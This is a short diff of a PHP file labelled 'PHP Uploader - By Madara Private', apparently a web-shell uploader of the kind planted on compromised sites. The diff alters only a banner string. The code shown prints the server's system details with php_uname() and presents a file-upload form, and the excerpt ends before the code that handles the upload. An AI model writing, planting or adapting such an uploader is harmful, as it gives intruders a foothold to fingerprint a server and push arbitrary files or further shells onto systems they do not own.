@@ -1,6 +1,6 @@
 <?php
 echo "PHP Uploader - By Madara Private";
-echo "Enjoy ! :*";
+echo " Enjoy Kids ! :*";
 echo "<br>".php_uname()."<br>";
 echo "<form method='post' enctype='multipart/form-data'>
 <input type='file' name='zb'><input type='submit' name='upload' value='upload'>
